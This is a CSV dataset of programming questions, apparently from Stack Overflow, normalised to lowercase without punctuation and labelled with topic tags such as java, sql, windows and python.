Id,Title,Tag
75180,how to display a dynamically allocated array in the visual studio debugger if you have a statically allocated array the visual studio debugger can easily display all of the array elements  however if you have an array allocated dynamically and pointed to by a pointer it will only display the first element of the array when you click the  to expand it  is there an easy way to tell the debugger show me this data as an array of type foo and size x,c++
75230,how do you quickly find the url for a win32 api on msdn how do you quickly find the url for a win32 api on msdn  its easy for net methods  just add the method name for example systembytetostring to httpmsdnmicrosoftcomlibraryhowever for win32 apis say getlongpathname this doesnt work httpmsdnmicrosoftcomenuslibrarygetlongpathnamei want to be able to use the url in code comments or documentation  so the url one gets with an msdn or google search for example httpmsdnmicrosoftcomlibraryaa364980aspx isnt really what im looking for  id really like my code comments to look something like blah blah blah  see httpmsdnmicrosoftcomenuslibrarygetlongpathname for more informationwhats the magic pixie dust for win32 apis  or does it only work for net methods,windows
75270,open source database plugin for eclipse does anyone know of a good open source plugin for database querying and exploring within eclipse the active database exploring plugin within eclipse is really geared around being associated with a java project while i am just trying to run adhoc queries and explore the schema i am effectively looking for a just a common quick querying tool without the overhead of having to create a code project i have found a couple open source database plugins for eclipse but these have not seen active development in over a yearany suggestions,database
75340,xslt processing infrom ruby can anyone recommend an efficient method to execute xslt transforms of xml data within a ruby application the xsl gem rexsl is not available yet and while i have seen a project or two that implement it im wary of using them so early on a friend had recommended a shell out call to perl but im worried about resources this is for a linux environment,xml
75400,nhibernate to not cache a property how can i configure nhibernate to not cache a filei know i can create a method that does an hsql but can i through a configuration setting in the ltclassxml file or the hibernate xml file itself to not cache a property,.net
75440,how do i get the name of a python class as a string what method do i call to get the name of a class,python
75500,best way to convert pdf files to tiff files i have around 1000 pdf filesand i need to convert them to 300 dpi tiff files what is the best way to do this if there is an sdk or something or a tool that can be scripted that would be ideal ,pdf
75650,best way to do visual studio post build deployment in a team environment im working in a team environment where each developer works from their local desktop and deploys to a virtual machine that they own on the network  what im trying to do is set up the visual studio solution so that when they build the solution each projects deployment is handled in the postbuild event to that developers virtual machinewhat id really like to do is give ownership of those scripts to the individual developer as well so that they own their post build steps and they dont have to be the same for everyonea couple of questionsis a post build event the place to execute this type of deployment operation  if not what is the best place to do itwhat software tools or tutorialsblog posts are available to assist in developing an automatic deployment system that supports these scenariosedit msbuild seems to be the way to go in this situation  anyone use alternative technologies with any successedit if you are reading this question and wondering how to execute a different set of msbuild tasks for each developer please see this question executing different set of msbuild tasks for each user,visual-studio
75700,jpa multiple transaction managers i have one applicationcontextxml file and it has two orgspringframeworkormjpajpatransactionmanager each with its own persistence unit different databases configured in a spring middleware custom applicationi want to use annotation based transactions transactional to not mess around with transactionstatus commit save and rollbacka coworker mentioned that something gets confused doing this when there are multiple transaction managers even though the context file is set configured correctly the references go to the correct persistence unitanyone ever see an issuein your config would you have two transaction managerswould you have txmanager1 and txmanager2thats what i have with jpa two different spring beans that are transaction managers,java
75980,when are you supposed to use escape instead of encodeuri  encodeuricomponent when encoding a query string to be sent to a web server  when do you use escape and when do you use encodeuri or encodeuricomponentuse escapeescape amporuse encodeuri  encodeuricomponentencodeurihttpwwwgooglecomvar1value1ampvar2value2encodeuricomponentvar1value1ampvar2value2,javascript
76080,how do you reliably get the quick launch folder in xp and vista we need to reliably get the quick launch folder for both all and current users under both vista and xp  im developing in c but this is probably more of a general windows api questionfor reference here is code to get the application data folder under both systemshresult hres cstring basepathhres  shgetspecialfolderpaththisgtgetsafehwnd basepathgetbuffermaxpath csidlappdata falsebasepathreleasebufferi suspect this is just a matter of knowing which subfolder microsoft usesunder windows xp the app data subfolder ismicrosoftinternet explorerquick launchunder vista it appears that the subfolder has been changed toroamingmicrosoftinternet explorerquick launchbut id like to make sure that this is the correct way to determine the correct locationfinding the correct way to determine this location is quite important as relying on hard coded folder names almost always breaks as you move into international installs etc  the fact that the folder is named roaming in vista makes me wonder if there is some special handling related to that folder akin to the local settings folder under xpeditthe following msdn article  httpmsdnmicrosoftcomenuslibrarybb762494aspx indicates that csidlappdata has an equivalent id of folderidroamingappdata which does seem to support stocksrs assertion that csidlappdata does return cusersxxxxappdataroaming so it should be possible to use the same relative path for csidlappdata to get to quick launch microsoftinternet explorerquick launchso the following algorithm is correct per mshresult hres cstring basepathhres  shgetspecialfolderpaththisgtgetsafehwnd basepathgetbuffermaxpath csidlappdata falsebasepathreleasebuffercstring qlpath  basepath  microsoftinternet explorerquick launchit would also be a good idea to check hres to ensure that the call to shgetspecialfolderpath was successful,windows
76210,production test developer environments vs security what are current practices for enabling developers to build systems that contain private data can anyone point to a best practices guide for that sort of thingwe have a catch22 here in that developers need to write applications that go against systems that have data that is considered private the it administration would like for us developers to not have access to the data ie provide a schema or data structure but not data itself whereas most developers myself included would like to have access to the production data since not having a representative dataset can lead to bad assumptions eg the format of data and bugs later ondoes anyone have any formalized best practices for this type of thing especially official guildines from some bigco eg microsoft ibm might help since it is needed to convince management,security
76300,whats the best way to return variables from a syncexec in my swt java app i often want to return information from inside a displaysyncexec call  the best way ive found so far to do this isfinal arraylistltintegergt result  new arraylistltintegergtguidisplaysyncexecnew runnable public void run    messagebox mb         set up messagebox    resultaddmbopenif swtok  resultget0     i think this is allowed because arraylist is threadsafe but is there a better container i should be using or an easier way altogether,java
76350,freecheap powerdesigner alternative we are using powerdesigner at work for database modelling but there is a hell of a price tag on that piece of software and frankly all i use is physical diagrams for ms sql which is about 1 of what pd knowsare there any good alternatives i know about visio and ms sql diagrams but looking for other options,sql
76440,extreme programming as developers and as professional engineers have you been exposed to the tenants of extreme programming as defined in the version 1 by kent beckwhich of those 12 core principles do you feel you have been either allowed to practice or at least be a part of in your current job or others pair programming5 planning game test driven development whole team being empowered to deliver continuous integration refactoring or design improvement small releases coding standards collective code ownership simple design system metaphor sustainable pacefrom an engineers point of view i feel that the main engineering principles of xp arevastly superior to anything else i have been involved in what is your opinion,agile
76650,perl use of uninitialized value in numeric lt  at datemanippm this has me puzzled this code worked on another server but its failing on perl v588 with datemanip loaded from cpan todaywarninguse of uninitialized value in numeric lt lt at homedownsidelibdatemanippm line 3327at dailyupdatepl line 13        mainanonuse of uninitialized value in numeric lt lt athomedownsid called athomedownsidelibdatemanippm line 3327        datemanipdatesecssince1970gmt09 16 2008 00 21 22 called athomedownsidelibdatemanippm line 1905        datemanipunixdatetoday ymd called attickersymbolsupdatesymbolspm line 122        tickersymbolsupdatesymbolsgetdate called attickersymbolsupdatesymbolspm line 439        tickersymbolsupdatesymbolsupdatesymboldbidbhash0x87fcc34tickersymbolssymbolhash0x8a43540 called attickersymbolsupdatesymbolspm line 565tickersymbolsupdatesymbolsupdatesymbolsdbidbhash0x87fcc34 1 0 1 called atdailyupdatepl line 149        edgarupdatesymbolsdbidbhash0x87fcc34 1 0 1 called atdailyupdatepl line 180        edgardailyupdate called at dailyupdatepl line 193the code thats failing is simplysub getdate    my err                 today    ampdatemanipdateinittzest5edt           my today  datemanipunixdatetodayymd  todays date    print today is todayn         temp    returntodaythats right datemanip is failing for todaythe line in datemanip that is failing is  mytzcnfconvtz    tzcnftz  if  tz    tzzonen2olctz  if tz  d4    mytzs1    tzs1 if tzlt0  error occurs hereso datemanip is assuming that cnf has been initialized with elements convtz or tz  those are initialized in dateinit so that should have been taken care ofits only failing in my large program  if i just extract getdate aboveand run it standalone theres no error  so theres something about theglobal environment that affects thisthis seems to be a known but not understood problem  if you search google foruse of uninitialized value date manip there are about 2400 hitsthis error has been reported with mythtv and grepmail,perl
76680,fetch unread messages by user i want to maintain a list of global messages that will be displayed to all users of a web app i want each user to be able to mark these messages as read individually ive created 2 tables messages id body and messagesread userid messageidcan you provide an sql statement that selects the unread messages for a single user or do you have any suggestions for a better way to handle thisthanks,sql
76700,whats a simple method to dump pipe input to a file linux im looking for a little shell script that will take anything piped into it and dump it to a file for email debugging purposes any ideas,linux
76760,vs2008 setup project shared by all users application data files fellow anthropoids and lily pads and paddlewheelsim developing a windows desktop app in cnetwpf using vs 2008 the app is required to install and run on vista and xp machines im working on a setupwindows installer project to install the appmy app requires readmodifywrite access to a sqlce database file sdf and some other databasetype files related to a thirdparty control im using these files should be shared among all userslogins on the pc none of which can be required to be an administrator this means of course that the files cant go in the programs own installation directory as such things often did before the arrival of vista yes yesi had expected the solution to be simple vista and xp both have sharedapplicationdata folders intended for this purpose programdata in vista documents and settingsall usersapplication data in xp the net environmentgetfolderpathspecialfoldercommonapplicationdata call exists to find the paths to these folders on a given pc yes yesbut i cant figure out how to specify the sharedapplicationdata folder as a target in the setup projectthe setup project offers a common files folder but thats intended for shared program components not data files is usually located under program files and has the same security restrictions anything else in program files does yes yesthe setup project offers a users application data folder but thats a peruser folder which is exactly what im trying to avoid yes yesis it possible to add files to the sharedappdata folder in a robust crosswindowsversion way from a vs 2008 setup project can anyone tell me how,visual-studio-2008
76870,is there a way to dynamically load a properties file in nant i want to load a different properties file based upon one variablebasically if doing a dev build use this properties file if doing a test build use this other properties file and if doing a production build use yet a third properties file,.net
76930,what is the easiest way to adjust exif timestamps on photos from multiple cameras in windows vista scenario  several people go on holiday together armed with digital cameras and snap away some people remembered to adjust their camera clocks to local time some left them at their home time some left them at local time of the country they were born in and some left their cameras on factory timethe problem timestamps in the exif metadata of photos will not be synchronised making it difficult to aggregate all the photos into one combined collectionthe question assuming that you have discovered the deltas between all of the camera clocks what is the simplest way to correct these timestamp differences in windows vista,exif
77090,are there any good continuous testing plugins for eclipse out right now ive used the mit continuous testing plugin in the past but it has long since passed out of date and is no longer compatible with anything approaching a modern release of eclipse does anyone have a good replacement free naturally is preferred ,eclipse
77280,how do you set up an api key system for your website let say that i have a website with some information that could be access externally those information need to be only change by the respected client example google analytic or wordpress api key how can i create a system that work like that no matter the programming language,api-design
77670,what is the best way to create a security architecture im designing a portals security architecture the site has pages videos pictures users databases file system objects etc what is the best way to control access to all of these objects how would you store permissions is a 64bit database variable enough for storing permissions eg windows employs acls and sids do you have a more uptodate solution ,security
77890,in delphi how do i get an enumerator from localpolicycurrentprofilegloballyopenports in the firewall api i am writing some code to see if there is a hole in the firewall exception list for winxp and vista for a specific port used by our client software i can see that i can use the netfwmgrlocalpolicycurrentprofilegloballyopenports to get a list of the current open port exceptions  but i can not figure out how to get that enumerated list in to something that i can use in my delphi program my latest try is listed below its giving me an access violation when i use portlistitem i know thats wrong it was mostly wishful thinking on my part any help would be appreciatedfunction tfirewallutilityisportinexceptionlistiportnumber integer booleanvar  i h integer  portlist port olevariantbegin  result  false  portlist  mxfirewallmanagerlocalpolicycurrentprofilegloballyopenports  for i  0 to portlistcount  1 do  begin    port  portlistitemi    if portportnumber  iportnumber then    begin      result  true      break    end  endend,delphi
77900,how to convert all controls on an aspx webform to a readonly equivalent has anyone ever written a function that can convert all of the controls on an aspx page into a read only version  for example if userdetailsaspx is used to edit and save a users information if someone with inappropriate permissions enter the page i would like to render it as readonly  so most controls would be converted to labels loaded with the corresponding data from the editable original controli think it would likely be a fairly simple routine ie  dim ctlparent as control  metxttestparent  dim ctlold as textbox  metxttest  dim ctlnew as label  new label  ctlnewwidth  ctloldwidth  ctlnewtext  ctloldtext  ctlparentcontrolsremovectlold  ctlparentcontrolsaddctlnewis really all you need for a textbox  label conversion but i was hoping someone might know of an existing function out there as there are likely a few pitfalls here and there with certain controls and situationsupdate just setting the readonly property to true is not a viable solution as it looks dumb having things greyed out like that avoiding manually creating a secondary view is the entire point of this so using an ingenious way to display a read only version of the user interface that was built by hand using labels is wat i am trying to avoidthanks,asp.net
77960,what to put in a session variable i recently came across a asp 11 web application that put a whole heap of stuff in the session variable  including all the db data objects and even the db connection object it ends up being huge when the web session times out four hours after the user has finished using the application sometimes their database transactions get rolled back im assuming this is because the db connection is not being closed properly when iis kills the sessionanyway my question is what should be in the session variable clearly some things need to be in there the user selects which plan they want to edit on the main screen so the plan id goes into the session variable is it better to try and reduce the load on the db by storing all the details about the user and their manager etc and the plan they are editing in the session variable or should i try to minimise the stuff in the session variable and query the db for everything i need in the pageload event,asp.net
77990,redraw screen in terminal how do some programs edit whats being displayed on the terminal to pick a random example the program sl im thinking of the linux terminal here it may happen in other oss too i dont know  ive always thought once some text was displayed it stayed there how do you change it without redrawing the entire screen ,linux
78230,compiling mxml files with ant and flex sdk i am just getting started with flex and am using the sdk not flex builder i was wondering whats the best way to compile a mxml file from an ant build script ,flex
78360,absolute minimum requirements for good software design i am trying to write a spec for a software application the application takes inputs from static files configuration data files that it obtained by ftp and live data obtained via a tcp socket it does some stuff and generates output data which is delivered to somebody else via a tcp socketit is not so difficult to write a spec describing what the system should do when nothing goes wrong and even describing what it should do when certain things go wrongbut recent experience has told me that it might be a good idea to include explicitly what some people might call nobrainers like keep the userconfigurable data separate from the software so when an upgrade is installed it doesnt clobber the user data or have userconfigurable levels of error logging things like thatdoes anyone have a list of basic requirements that they would want any system to have and that any decent software developer would do more or less automatically,software-engineering
78380,fighting with protected mode in vista our application commonly used an activex control to download and install our client on ie xp and prior however as our user base has drifted towards more vista boxes with protected mode on we are required to investigateso going forward is it worth the headache of trying to use the protected mode api  is this going to result in a deluge of dialog boxes and admin rights to do the things our app needs to do write to some local file places access some other applications etcim half bent on just adding a nonbrowser based installer app that will do the dirty work of downloading and installing the client if need be this would only need to be installed once and in large corporate structures it could be pushed out by itare there some other ideas im missing,security
78450,python reportlab use of splitfirstsplitlast im trying to use python with reportlab 22 to create a pdf reportaccording to the user guide  special tablestyle indeces sic    in any style command the first row index may be set to one of the special strings splitlast or splitfirst to indicate that the style should be used only for the last row of a split table or the first row of a continuation this allows splitting tables with nicer effects around the splitive tried using several style elements includingtextcolor 0 splitfirst 1 splitfirst colorsblack textcolor 0 splitfirst 1 0 colorsblack textcolor 0 splitfirst 1 1 colorsblackand none of these seems to work  the first generates a typeerror with the message typeerror cannot concatenate str and int objectsand the latter two generate typeerrors with the messagetypeerror an integer is requiredis this functionality simply broken or am i doing something wrong  if the latter what am i doing wrong,python
78560,locked sql server data files i have an sql server database where i have the data and log files stored on an external usb drive  i switch the external drive between my main development machine in my office and my laptop when not in my office  i am trying to use spdetachdb and spattachdb when moving between desktop and laptop machines  i find that this works ok on the desktop  i can detach and reattach the database there no problems  but on the laptop i cannot reattach the database the database was actually originally created on the laptop and the first detach happened there  when i try to reattach on the laptop i get the following errorunable to open the physical file psqldataappmanagermdf operating system error 5 5error not foundi find a lot of references to this error all stating that it is a permissions issue  so i went down this path and made sure that the sql server service account has appropriate permissions  i have also created a new database on this same path and been able to succesfully detach and reattach it  so i am confident permissions is not the issuefurther investigation reveals that i cannot rename copy or move the data files as windows thinks they are locked  even when the sql server service is stopped  process explorer does not show up any process locking the files  how can i find out what is locking the files and unlock themi have verified that the databases do not show up in ssms  so sql server does not still think they existupdate 18092008i have tried all of the suggested answers to date with no success  however trying these suggestions has helped to clarify the situation  i can verify the followingi can successfully detach and reattach the database only when the external drive is attached to the server that a copy of the database is restored to  effectively the server where the database is created  lets call this the source server  i can move copy or rename the data and log files after detaching the database while the external drive is still attached to the source server  as soon as i move the external drive to another machine the data and log files are locked although the 2 tools that i have tried  process explorer and unlocker both find no locking handles attached to the files nb  after detaching the database i tried both stopping the sql server service and shutting down the source server prior to moving the external drive  still with no successso at this stage all that i can do to move data between desktop and laptop is to make a backup of the data onto the external drive move the external drive restore the data from the backup  works ok but takes a bit more time as the database is a reasonable size 1gb  anyway this is the only choice i have at this stage even though i was trying to avoid having to go down this path,sql-server-2005
78570,which javascript library is recommended for neat ui effects i need a javascript library that supports ajax as well as help me in making simple and neat animation effects in a website i am working onwhich library do you recommend,html
78590,similar thing to rjs used in ruby on rails in the java web app world in ruby on rails theres rjs templates that help do ajax by returning javascript code that will be executed in the client browser how can i do a similar thing in the javaj2ee world is google widget toolkit similar to rjs what options do i have ,java
78700,kvm and linux wireless bridging im using kvm to run a windows virtual machine on my linux box networking is accomplished through a tap device hooked into a bridged ethernet device which allows the windows vm to basically appear like a separate physical computer on my network this is pretty nicehowever my understanding is that most if not all wireless drivers cant support bridging id really like to be able to roam a little more freely while im working  does anyone know of an effective workaroundusermode networking wont work as i have to use some windows vpn software that wants lowerlevel networking access,networking
78850,publishing vs copying what is the difference between publishing a website with visual studio and just copying the files over to the server  is the only difference that the publish files are precompiled,asp.net
78900,how to check for memory leaks in guile extension modules i develop an extension module for guile written in c  this extension module embeds a python interpretersince this extension module invokes the python interpreter i need to verify that it properly manages the memory occupied by python objects  i found that the python interpreter is wellbehaved in its own memory handling so that by running valgrind i can find memory leaks due to bugs in my own python interpreter embedding code if there are no other interfering factors  however when i run guile under valgrind valgrind reports memory leaks  such memory leaks obscure any memory leaks due to my own code  the question is what can i do to separate memory leaks due to bugs in my code from memory leaks reported by valgrind as due to guile  another tool instead of valgrind  special valgrind options  give up and rely upon manual code walkthrough,python
79210,best c ide for nix what is the best c ide for a nix envirnoment i have heard the cc module of eclipse is decent as well as notepad but beyond these two i have no real idea any thoughts or comments,c++
79350,what open source virtual private server program do you recommend with windows as host i am looking to have 4 virtual serversvarious linux flavors running on a windows server 2003 r2 64 bit edition server located at a datacenter  i can also purchase a 2008 server or 32 bit 2k3 if needed  they would each have their own ip address for networking so that they could be publicly accessed  i do not know much about vps software but have worked with it before,windows
79360,how can i prevent deformation when rotating about the lineofsight in opengl ive drawn an ellipse in the xz plane and set my perspective slightly up on the yaxis and back on the z looking at the center of ellipse from a 45degree angle using gluperspective to set my viewing frustrumunrotated the major axis of the ellipse spans the width of my viewport  when i rotate 90degrees about my lineofsight the major axis of the ellipse now spans the height of my viewport thus deforming the ellipse in this case making it appear less eccentricwhat do i need to do to prevent this deformation or at least account for it so rotation about the lineofsight preserves the perceived major axis of the ellipse in this case causing it to go beyond the viewport,c
79490,linux uptime history how can i get a history of uptimes for my debian box after a reboot i dont see an option for the uptime command to print a history of uptimes if it matters i would like to use these uptimes for graphing a page in php to show my webservers uptime lengths between bootsupdate not sure if it is based on a length of time or if last gets reset on reboot but i only get the most recent boot timestamp with the last command last x also does not return any further info  sounds like a script is my best betupdateuptimed is the information i am looking for not sure how to grep that info in code managing my own script for a db sounds like the best fit for an application,linux
79780,parsing http headers ive had a new found interest in building a small efficient web server in c and have had some trouble parsing post methods from the http header would anyone have any advice as to how to handle retrieving the namevalue pairs from the posted datapost test http11host testdomaincom7017useragent mozilla50 windows u windows nt 51 enus rv1901 gecko2008070208 firefox301accept texthtmlapplicationxhtmlxmlapplicationxmlq09q08acceptlanguage enusenq05acceptencoding gzipdeflateacceptcharset iso88591utf8q07q07keepalive 300connection keepalivereferer httptestdomaincom7017indexhtmlcookie utma4316624121741329912207263141221171690122120018116 utmz43166241122072631411utmccndirectutmcsrdirectutmcmdnonecachecontrol maxage0contenttype applicationxwwwformurlencodedcontentlength 25field1asfdampfield2a3f3f3 thisi see no tangible way to retrieve the bottom line as a whole and ensure that it works every time im not a fan of hardcoding in anything,c
79850,how do you design data models for bigtabledatastore gae since the google app engine datastore is based on bigtable and we know thats not a relational database how do you design a database schemadata model for applications that use this type of database system,python
79880,activerecordsaveonlyvalidattributes im looking for a variation on the save method that will only save attributes that do not have errors attached to them so a model can be updated without being valid overall and this will still prevent saving invalid data to the databaseby valid attributes i mean those attributes that give nil when calling modelinstanceerrorsonattributeanyone have an idea of how to accomplish thisso far i have the followingdef savevalidattributes  valid  updateatrtibutes attributesinjectk v m mk  v unless errorsonktosym m endthis works if theres no processing done on assignment which in my case there isfor example i have a database column startdate and two methods defineddef nicestartdatestartdate selfstartdate  chronicparsestartdate  startdateenddef nicestartdate selfstartdatetosendthese two methods allow me to properly parse the user inputted dates using chronic before saving so second way of doing this one attribute at a timedef savevalidattributesattrib   valid  attribeachkv sendk v save reloadendthe model needs to be reloaded each time since if one of the dates is invalid and doesnt save it will prevent all further attributes from savingis there a better way to do this im sure this isnt an uncommon problem in the rails world i just cant seem to find anything in the google universe of knowledge,ruby-on-rails
79960,how to truncate a string in php to the word closest to a certain number of characters i have a code snippet written in php that pulls a block of text from a database and sends it out to a widget on a webpage  the original block of text can be a lengthy article or a short sentence or two but for this widget i cant display more than say 200 characters  i could use substr to chop off the text at 200 chars but the result would be cutting off in the middle of words what i really want is to chop the text at the end of the last word before 200 chars,php
80120,cruise control net vs team foundation build our team is setting up nightly and continuous integration builds  we own team foundation server and could use team foundation build  im more familiar with ccnet and lean that way but management sees all the money spent on tfs and wants to use itsome things i like better about ccnet is the flexibility of notifications as well as the ease of implementing custom scriptsif you have experience with both products which do you prefer and why,tfs
80160,what does coinitspeedovermemory do when calling coinitializeex you can specify the following values for dwcoinittypedef enum tagcoinit     coinitmultithreaded      0x0    coinitapartmentthreaded  0x2    coinitdisableole1dde    0x4    coinitspeedovermemory  0x8 coinitwhat does the suggestively titled speed over memory value do is it ignored these days in com,com
80320,poppler programming poppler is a classic example of something without documentation that you would prefer be documented this question is language agnostic just asking about the general ideain short how do you make a pdf viewer control with popplerfrom what i can tell youd need to use poppler to render it to some surface which sounds good up until you ask yourself how the user would select text and such does poppler offer a window for its various bindings or do you have to code it all yourself,language-agnostic
80370,reparenting a window as a tab in a gtk notebook im using mono with gtk and am trying to display an existing window as a new tab in a gtknotebook  im currently reparenting the widget to the notebook as followsmywindow mywindow  new mywindowmywindowchildren0reparentmynotebookshould i be doing this or is there a better way to reuse an existing window so that you can display it on a tab,gtk
80470,performance of an large directory structure networked application im trying to find out what the performance of a large directory structure would be if deep directories were to be accessed on a shared nfs filesystem the structure would be excessively large with 4 levels of nested directories each level containing 1024 directories 1024 at root 1024 in a given subdirectory and so onthis filesystem would be on a network repository that users would be accessing for their personal information the data would be replicated on multiple servers and loadbalanced but still each machine would have a decent load at all timesif the 4th level contained the information that the users were looking for how bad would the performance be if all were accessing different subdirectories could this be resolved by caching inode information or no ive been searching on this for a while but im primarily finding information on large files rather than large directory structures ,performance
80550,provisioning issue using crmdeploymentservice ive been working on provision of an organization for quite a few days  and had faced  few issues which i was successful in resolving themlet me explain abt the issues i faced the mscrmservices is a process that is running under the network servicewhen i call the execute method on the service from a console applicationall actions preformed run under the context of the network service accountthe network service account has not enough rights to create an organizationso many problems occur during the actionregistry access not allowednot the correct sql server rightsnot enough ad rightsimpersonation doesnt work the service uses the process account to performthe actions  the only thing that works is to run the crmapppool identity asan administrator which has the deployment administrator rights added throughthe deployment manager tool but this issues in crm deployment doesnt seem to faceoff from me  now that i have a new issue after changing the pool identity to the system administrator the deployment service gives an error saying unauthorized and further when i check the log it says  process w3wp organization00000000000000000000000000000000  thread    1 category exception user  00000000000000000000000000000000 level error   crmexceptionctor    at crmexceptionctorstring message exception innerexception int32  errorcode boolean isflowcontrolexception boolean enabletrace    at crmexceptionctorstring message int32 errorcode    at crmobjectnotfoundexceptionctorbusinessentitymoniker moniker    at  businessprocessobjectdoretrievepublishablesinglebusinessentitymoniker  moniker entityexpression entityexpression boolean  includeunpublished executioncontext context    at businessprocessobjectretrieveunpublishedbusinessentitymoniker  moniker entityexpression entityexpression executioncontext context    at organizationuiserviceretrieveunpublishedbusinessentitymoniker  moniker entityexpression entityexpression executioncontext context    at organizationuiserviceretrieveoldformxmlbusinessentitymoniker  moniker executioncontext context    at organizationuiserviceextractandsaveformlabelsibusinessentity  entity executioncontext context    at organizationuiservicecreateibusinessentity entity  executioncontext context    at importformxmlhandlercreateorguiorganizationuiservice  orguiservice xmlnode formnode    at importformxmlhandlerimportitem    at importhandlerimport    at importhandlerimport    at rootimporthandlerrunimport    at importxmlrunimport    at neworgutilityorganizationimportdefaultdataguid organizationid  version existingdatabaseversion string importfile    at neworgutilityorganizationimportdefaultdataguid organizationid  string importfile    at neworgutilityconfigureorganizationstring organizationid string  organizationname string useraccountname string userfirstname string  userlastname string useremail string languagecode string  privilegedusergroup string sqlaccessgroup string usergroup string  reportinggroup string privilegedreportinggroup boolean  grantnetworkserviceaccess boolean autogroupmanagement string  importfilelocation boolean sqmoption    at createorganizationinstallercreateguid organizationid string  organizationuniquename string organizationfriendlyname string  basecurrencycode string basecurrencyname string basecurrencysymbol  string initialuserdomainname string initialuserfirstname string  initialuserlastname string sqlservername uri reportserverurl string  privilegedusergroupname string sqlaccessgroupname string  usergroupname string reportinggroupname string  privilegedreportinggroupname string applicationpath string  languageid boolean sqmoption string organizationcollation  multipletenancy multipletenancy    at createorganizationinstallercreateicreateorganizationinfo  organizationinfo    at organizationservicecreatedeploymententity entity    at createrequestprocess    at crmdeploymentserviceexecutedeploymentservicerequest request    at runtimemethodhandleinvokemethodfastobject target object  arguments signaturestructamp sig methodattributes methodattributes  runtimetypehandle typeowner    at runtimemethodhandleinvokemethodfastobject target object  arguments signature sig methodattributes methodattributes  runtimetypehandle typeowner    at runtimemethodinfoinvokeobject obj bindingflags invokeattr  binder binder object parameters cultureinfo culture boolean  skipvisibilitychecks    at runtimemethodinfoinvokeobject obj bindingflags invokeattr  binder binder object parameters cultureinfo culture    at logicalmethodinfoinvokeobject target object values    at webservicehandlerinvoke    at webservicehandlercoreprocessrequest    at syncsessionlesshandlerprocessrequesthttpcontext context    at  callhandlerexecutionstepsystemwebhttpapplicationiexecutionstepexecute    at httpapplicationexecutestepiexecutionstep step booleanamp  completedsynchronously    at applicationstepmanagerresumestepsexception error    at  httpapplicationsystemwebihttpasynchandlerbeginprocessrequesthttpcontext  context asynccallback cb object extradata    at httpruntimeprocessrequestinternalhttpworkerrequest wr    at httpruntimeprocessrequestnodemandhttpworkerrequest wr    at isapiruntimeprocessrequestintptr ecb int32 iwrtypeany idea on thishave anyone of you come across such an issue ive been trying to resolve this issue but hard luck,deployment
80650,how do i register a custom url protocol in windows how do i register a custom protocol with windows so that when clicking a link in an email or on a web page my application is opened and the parameters from the url are passed to it,windows
80690,phantom referenced objects phantom references serve for postmortem operationsthe java specification states that a phantom referenced object will not be deallocated until the phantomreference itself is cleanedmy question is what purpose does this feature object not deallocated servethe only idea i came up with is to allow native code to do postmortem cleanup on the object but it isnt much convincing,java
80770,how xquery is actually used i have been reading lot of xquery tutorial on the web site almost all of them are teaching me the xquery syntax lets say i have understood the xquery syntax how am i going to actually implement xquery on my web sitefor example i have bookxmlltxml version10 encodingiso88591 gtltbooksgtltbookgt   lttitlegtdoraemonlttitlegt   ltauthoridgt1ltauthoridgtltbookgtltbookgt   lttitlegtultramanlttitlegt   ltauthoridgt2ltauthoridgtltbookgtltbooksgtthen i have authorxmlltxml version10 encodingiso88591 gtltauthorsgtltauthor id1gtmr altauthorgtltauthor id2gtmr bltauthorgtltauthorsgti want to generate html which looks like followinglttablegtlttrgtlttdgttitlelttdgtlttdgtauthorlttdgtlttrgtlttrgtlttdgtdoraemonlttdgtlttdgtmr alttdgtlttrgtlttrgtlttdgtultramanlttdgtlttdgtmr blttdgtlttrgtlttablegtplease show me some example or any web site that i can do reference thanks very much,xquery
80820,openfiledialog how about specify directory dialog on a file path field i want to capture the directory path liketextbox1text  directory pathanyone,c#
80940,is anyone using xforms in their web applications a few years ago we started playing around with xforms from the w3c for a web app which required hundreds of custom formsas they arent currently supported natively by the major browsers what parserstools are you using on your projects todayim not really interested in plugins  this needs to be something server side that emulates xforms,w3c
80980,creatingmodifying images in javascript is it possible to dynamically create and modify images on a per pixel level in javascript on client side or has this to be done with server based languaged such as php my use case is as followsthe user opens webpage and loads locally stored imagea preview of the image is displayedthe user can modify the image with a set of sliders pixel level operationsin the end he can download the image to his local hddwhen searching in the web i just found posts about using ies filtering method but didnt find anything about image editing functions in javascript,javascript
81150,best way to tackle global hotkey processing in c   possible duplicate  how can i register a global hot key to say ctrlshiftletter using wpf and net 35  id like to have multiple global hotkeys in my new app to control the app from anywhere in windows and all of the given sourcessolutions i found on the web seem to provide with a sort of a limping solution either solutions only for one ghotkey or solutions that while running create annoying mouse delays on the screendoes anyone here know of a resource that can help me achive this that i can learn fromanythingthanks   ,c#
